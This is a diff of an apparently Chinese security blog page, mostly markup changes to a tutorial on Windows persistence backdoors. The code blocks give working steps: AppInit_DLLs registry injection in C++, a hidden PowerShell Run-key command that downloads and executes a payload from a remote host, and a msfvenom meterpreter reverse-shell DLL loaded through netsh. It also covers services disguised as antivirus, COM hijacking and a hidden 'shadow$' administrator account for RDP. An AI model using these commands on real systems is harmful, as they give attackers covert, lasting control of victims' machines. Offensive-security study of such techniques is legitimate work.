 <p><strong>测试</strong></p>
 <p><code>Appinit_DLLS</code> 在注册表中的位置为:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Window\Appinit_Dlls</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Window\Appinit_Dlls</code></pre>
 
 <p>我们先查看下位置的相关信息</p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220703113736225.png" alt="image-20220703113736225"></p>
@@ -442,9 +535,53 @@
 <blockquote>
 <p>其实也可以手动更改，不嫌麻烦的话</p>
 </blockquote>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Project1.exe</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HKEY hKey;</span><br><span class="line">	DWORD dwDisposition;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> path[] = <span class="string">&quot;C:\\dll.dll&quot;</span>;</span><br><span class="line">	DWORD dwData = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">RegCreateKeyExA</span>(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WRITE, <span class="literal">NULL</span>, &amp;hKey, &amp;dwDisposition);</span><br><span class="line">	<span class="built_in">RegSetValueExA</span>(hKey, <span class="string">&quot;AppInit_DLLs&quot;</span>, <span class="number">0</span>, REG_SZ, (BYTE*)path, (<span class="number">1</span> + ::<span class="built_in">lstrlenA</span>(path)));</span><br><span class="line">	<span class="built_in">RegSetValueExA</span>(hKey, <span class="string">&quot;LoadAppInit_DLLs&quot;</span>, <span class="number">0</span>, REG_DWORD, (BYTE*)&amp; dwData, <span class="built_in">sizeof</span>(DWORD));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line">	<span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs c++"><span class="hljs-comment">// Project1.exe</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span> </span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span>
+<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
+ 
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+	HKEY hKey;
+	DWORD dwDisposition;
+	<span class="hljs-type">const</span> <span class="hljs-type">char</span> path[] = <span class="hljs-string">&quot;C:\\dll.dll&quot;</span>;
+	DWORD dwData = <span class="hljs-number">1</span>;
+	<span class="hljs-built_in">RegCreateKeyExA</span>(HKEY_LOCAL_MACHINE, <span class="hljs-string">&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, KEY_WRITE, <span class="hljs-literal">NULL</span>, &amp;hKey, &amp;dwDisposition);
+	<span class="hljs-built_in">RegSetValueExA</span>(hKey, <span class="hljs-string">&quot;AppInit_DLLs&quot;</span>, <span class="hljs-number">0</span>, REG_SZ, (BYTE*)path, (<span class="hljs-number">1</span> + ::<span class="hljs-built_in">lstrlenA</span>(path)));
+	<span class="hljs-built_in">RegSetValueExA</span>(hKey, <span class="hljs-string">&quot;LoadAppInit_DLLs&quot;</span>, <span class="hljs-number">0</span>, REG_DWORD, (BYTE*)&amp; dwData, <span class="hljs-built_in">sizeof</span>(DWORD));
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+&#125;
+ 
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+	<span class="hljs-built_in">test</span>();
+	<span class="hljs-comment">//system(&quot;pause&quot;);</span>
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+&#125;
+</code></pre>
 
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="comment">// dll.dll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;hello qianxiao996&quot;</span>, <span class="string">&quot;AppCert&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span>
+<span class="hljs-comment">// dll.dll</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+
+<span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span>
+<span class="hljs-params"><span class="hljs-function">    DWORD  ul_reason_for_call,</span></span>
+<span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved</span></span>
+<span class="hljs-params"><span class="hljs-function">)</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;hello qianxiao996&quot;</span>, <span class="hljs-string">&quot;AppCert&quot;</span>, <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">switch</span> (ul_reason_for_call)
+    &#123;
+    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:
+    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:
+    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:
+    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:
+        <span class="hljs-keyword">break</span>;
+    &#125;
+    <span class="hljs-keyword">return</span> TRUE;
+&#125;</code></pre>
 
 <p>将生成的 <code>dll.dll</code> 放到 <code>c:\</code> 下面,运行 <code>Project1.exe</code>, 刷新，再次查看注册表</p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220703120306557.png" alt="image-20220703120306557"></p>
@@ -467,15 +604,19 @@
 </li>
 </ol>
 <p>用户级自启动注册表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</code></pre>
 
 <p>系统级自启动注册表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce</code></pre>
 
 <p>这里我在用户的注册表中添加了一项启动 <code>calc.exe</code>,我在重启机器之后,成功弹出计算器.<br><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5C934d811899b3b5d62766003b77ac59af.png" alt="20220622222111"></p>
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5Cca65d0c88ac3fd31bc3f99e113ebea4e.png" alt="20220622222621"></p>
 <p>使用以下命令可以一键实现无文件注册表后门：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8888/logo.gif&#x27;))\&quot;&quot; /f</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs shell">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8888/logo.gif&#x27;))\&quot;&quot; /f</code></pre>
 <p>简单说明下上面指令的含义：</p>
 <p>为 <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> 添加一个值(名称为<code>Keyname</code>, 类型为 <code>REG_SZ</code>, 值为<code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.28.142:8888/logo.gif&#39;))\&quot;</code>)</p>
 <p><code>/f</code> 表示强制覆盖当前现有注册表项.</p>
@@ -489,16 +630,30 @@
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5Cccffc70dd724f8f3f3113e13a22c6942.png" alt="20220622223158"></p>
 <p>举个例子:</p>
 <p>创建一个名为 <code>TEST_OnLogon</code> 的任务, 在每次用户登陆时,出发 <code>cmd.exe /c calc.exe</code> 命令:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn <span class="string">&quot;TEST_OnLogon&quot;</span> /sc onlogon /tr <span class="string">&quot;cmd.exe /c calc.exe&quot;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs sh">schtasks /create /tn <span class="hljs-string">&quot;TEST_OnLogon&quot;</span> /sc onlogon /tr <span class="hljs-string">&quot;cmd.exe /c calc.exe&quot;</span></code></pre>
 <p>这里提一下 <code>/sc</code> 参数,</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/sc 可指定以下参数,他们分别表示.</span><br><span class="line">MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY</span><br><span class="line">指定计划的时间单位。</span><br><span class="line"></span><br><span class="line">ONCE</span><br><span class="line">任务在指定的日期和时间运行一次。</span><br><span class="line"></span><br><span class="line">ONSTART</span><br><span class="line">任务在每次系统启动的时候运行。可以指定启动的日期，或下一次系统启动的时候运行任务。</span><br><span class="line"></span><br><span class="line">ONLOGON</span><br><span class="line">每当用户（任意用户）登录的时候，任务就运行。可以指定日期，或在下次用户登录的时候运行任务。</span><br><span class="line"></span><br><span class="line">ONIDLE</span><br><span class="line">只要系统空闲了指定的时间，任务就运行。可以指定日期，或在下次系统空闲的时候运行任务。</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">/sc 可指定以下参数,他们分别表示.
+MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY
+指定计划的时间单位。
+
+ONCE
+任务在指定的日期和时间运行一次。
+
+ONSTART
+任务在每次系统启动的时候运行。可以指定启动的日期，或下一次系统启动的时候运行任务。
+
+ONLOGON
+每当用户（任意用户）登录的时候，任务就运行。可以指定日期，或在下次用户登录的时候运行任务。
+
+ONIDLE
+只要系统空闲了指定的时间，任务就运行。可以指定日期，或在下次系统空闲的时候运行任务。</code></pre>
 
 
 <h2 id="进阶篇之服务自启动"><a href="#进阶篇之服务自启动" class="headerlink" title="进阶篇之服务自启动"></a>进阶篇之服务自启动</h2><p>类似于注册表自启动,不同的地方在于此时我们将需要启动的进程设置成为了服务.</p>
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5C23096355d3e9bf48b797c3e9ad77d723.png" alt="20220622230608"></p>
 <p>举个例子:</p>
 <p>创建一个名为 <code>demo</code> 的服务, 其启动方式为手动启动, 服务的内容为运行 <code>cmd.exe /c calc.exe</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create demo start= demand BinPath= &quot;cmd.exe /c calc.exe&quot;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">sc create demo start= demand BinPath= &quot;cmd.exe /c calc.exe&quot;</code></pre>
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5C337bbd71c50978a4ade0b20b1a07916d.png" alt="20220622231455"></p>
 <p>通过启动项可以看到确实增加了一个名为 <code>demo</code> 的进程.但是当我们使用 <code>net start demo</code> 时却没有弹出计算器. 通过 <code>任务管理器</code> 看到确实<br>增加了一个 <code>calc.exe</code> 的进程.</p>
 <p>为了确定能够上线,这里我生成一个 <code>msfshell.exe</code>,并注册一个服务用来启动他.<br>从结果可以看到 <code>net start msf</code> 的结果报告 <code>服务没有响应控制功能</code> ,但我的 <code>msf</code> 这边还是建立了 <code>meterpreter</code> 会话. 说明没有问题.<br><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5Ccfe1fbd4f0ea0b15ae8e3a8c93c1d008.png" alt="20220622233044"></p>
@@ -506,7 +661,8 @@
 <p>在通常情况下, 我们可以将 <code>start= auto</code> 以实现开机自启动,同时可以还可以使用 <code>sc description demo &quot;description&quot;</code> 以及 <code>sc config demo DisplayName &quot;name&quot;</code> 来使得我们的服务更加具有迷惑性</p>
 <p>举例:</p>
 <p>这里我将第二个创建的服务 <code>msf</code> 命名为了 <code>SystemAv</code>,并为其增加了一个描述<code>System Anti Anti- Virus</code>:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc config msf DisplayName &quot;SystemAv&quot;</span><br><span class="line">sc description msf &quot;System Anti Anti- Virus&quot;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">sc config msf DisplayName &quot;SystemAv&quot;
+sc description msf &quot;System Anti Anti- Virus&quot;</code></pre>
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5C9259f9c1bd9038c7ccd936ec2511a98e.png" alt="20220622234027"></p>
 <h2 id="进阶篇之VMI后门"><a href="#进阶篇之VMI后门" class="headerlink" title="进阶篇之VMI后门"></a>进阶篇之VMI后门</h2><p>&#x2F;&#x2F; TODO 这玩意网上介绍挺少的，后面补充</p>
 <h2 id="进阶篇之NetshHelper-DLL"><a href="#进阶篇之NetshHelper-DLL" class="headerlink" title="进阶篇之NetshHelper DLL"></a>进阶篇之NetshHelper DLL</h2><p>原理：</p>
@@ -515,13 +671,13 @@
 </blockquote>
 <p><code>实验</code></p>
 <p>这里我是用 <code>msfvenom</code>  生成一段恶意 <code>DLL文件</code>.</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.21 LPORT=4444 -f dll &gt; msf.dll</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs sh">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.21 LPORT=4444 -f dll &gt; msf.dll</code></pre>
 
 <blockquote>
 <p>踩坑 这里在生成 <code>dll文件</code> 时如果不指定 x64，在后面进行 <code>netsh add helper C:\user\Administrator\Destop\msf.dll</code> 导入时会出现 <code>下面帮助者dll 不能被加载</code> 的错误. 怀疑可能时因为操作系统时 64位的原因. 暂未测试.</p>
 </blockquote>
 <p>将 <code>dll</code> 上传目标机器后执行:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh add helper dll的路径.</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs sh">netsh add helper dll的路径.</code></pre>
 
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5Cf1e513c55bfa95c0189ec5ff0dc6b5d5.png" alt="20220623134740"></p>
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5C804366a20ef4aa252c5f79063f00d4d0.png" alt="20220623134959"></p>
@@ -539,7 +695,9 @@
 <p>一种常见的COM劫持方法是，将恶意DLL或者EXE文件放置到废弃的COM组件引用路径中。当COM组件通过正常系统调用执行时，攻击者的恶意代码就会被执行</p>
 </blockquote>
 <p><code>com</code> 注册表读取顺序：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Classes\CLSID</span><br><span class="line">HKEY_CLASSES_ROOT\CLSID</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">HKEY_CURRENT_USER\Software\Classes\CLSID
+HKEY_CLASSES_ROOT\CLSID
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\</code></pre>
 
 <p>注册表中，LocalServer32键表示可执行（exe）文件的路径、InprocServer32键表示动态链接库（DLL）文件的路径</p>
 <p>劫持原理：</p>
@@ -555,17 +713,22 @@
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220802202445685.png" alt="image-20220802202445685"></p>
 <p><strong>影子用户创建</strong>，</p>
 <p>点击确定后，这里显示 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] RDP is already enabled</span><br><span class="line">[+] RDP Port: 3389</span><br><span class="line">[*] ShadowUser Created Successfully</span><br><span class="line">[+] CloneUser: Administrator</span><br><span class="line">[+] Username: Shadow$</span><br><span class="line">[+] Password: DwfsLBXP4X</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">[*] RDP is already enabled
+[+] RDP Port: 3389
+[*] ShadowUser Created Successfully
+[+] CloneUser: Administrator
+[+] Username: Shadow$
+[+] Password: DwfsLBXP4X</code></pre>
 
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220802204315091.png" alt="image-20220802204315091"></p>
 <p>我们通过目标机器的管理用户,以及<code>net user</code> 确认 一下.</p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220802205044529.png" alt="image-20220802205044529"></p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220802204520619.png" alt="image-20220802204520619"></p>
 <p>可以看到在<code>管理其他用户</code>处并没有显示<code>shadow$用户</code>,并且使用 <code>net user</code> 也看不到用户 <code>shadow$</code> 的,但是使用 <code>net user shadow$</code>却是能够看到用户存在,但是此账户默认是没有激活的,所以我们还需要使用命令进行账户激活.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user shadow$ /active:yes</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">net user shadow$ /active:yes</code></pre>
 
 <p>并将用户添加到 <code>远程桌面组</code>:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;remote desktop Users&quot; shadow$ /add</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">net localgroup &quot;remote desktop Users&quot; shadow$ /add</code></pre>
 
 <p>远程桌面连接,发现可行!</p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220802205924354.png" alt="image-20220802205924354"></p>
@@ -602,13 +765,13 @@
          
           <li><a href="/">Home</a></li>
          
-          <li><a href="/archives/">Writing</a></li>
+          <li><a href="/archives/">Articles</a></li>
          
-          <li><a href="/categories/">categories</a></li>
+          <li><a href="/categories">Categories</a></li>
          
-          <li><a href="/tags/">tags</a></li>
+          <li><a href="/tags">Tags</a></li>
          
-          <li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li>
+          <li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projects</a></li>
         
       </ul>
     </div>
@@ -659,13 +822,13 @@
         <!--
        --><li><a href="/">Home</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
-       --><li><a href="/categories/">categories</a></li><!--
+       --><li><a href="/categories">Categories</a></li><!--
      --><!--
-       --><li><a href="/tags/">tags</a></li><!--
+       --><li><a href="/tags">Tags</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projects</a></li><!--
      -->
       </ul>
     </nav>
